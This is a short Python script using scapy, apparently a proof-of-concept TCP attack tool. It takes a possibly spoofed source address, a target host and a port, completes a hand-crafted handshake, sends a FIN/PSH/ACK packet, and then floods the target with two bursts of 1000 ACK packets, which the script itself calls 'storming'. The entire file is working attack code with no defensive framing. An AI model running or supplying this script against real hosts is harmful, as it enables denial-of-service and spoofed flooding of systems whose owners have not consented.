#!/usr/bin/python
import time
import sys
from scapy.all import *

# VARIABLES
src = sys.argv[1]
dst = sys.argv[2]
sport = 3333
#sport = random.randint(1024,65535)
dport = int(sys.argv[3])


# SYN
ip=IP(src=src,dst=dst)
SYN=TCP(sport=sport,dport=dport,flags='S',seq=1000)
SYNACK=sr1(ip/SYN)

print "Sent SYN packet"

# ACK
s = conf.L3socket(iface='en0')
ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
s.send(ip/ACK)

time.sleep(5)

print "Established session"

time.sleep(1)

# ACK
PUSH=TCP(sport=sport, dport=dport, flags='FPA', seq=SYNACK.ack, ack=ACK.seq + 1)
RST=sr1(ip/PUSH)

#time.sleep(60*5)
#print "Waited for 5 minutes"

# ACK
#ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
#s.send(ip/ACK)
#time.sleep(20)

print "Started storming"

for x in range(0,1000):
    ACK=TCP(sport=sport, dport=dport, flags='A', seq=RST.ack, ack=RST.seq + 1)
    s.send(ip/ACK)

print "Pause"
time.sleep(2)
print "Continue storming"

for x in range(0,1000):
    ACK=TCP(sport=sport, dport=dport, flags='A', seq=RST.ack, ack=RST.seq + 1)
    s.send(ip/ACK)
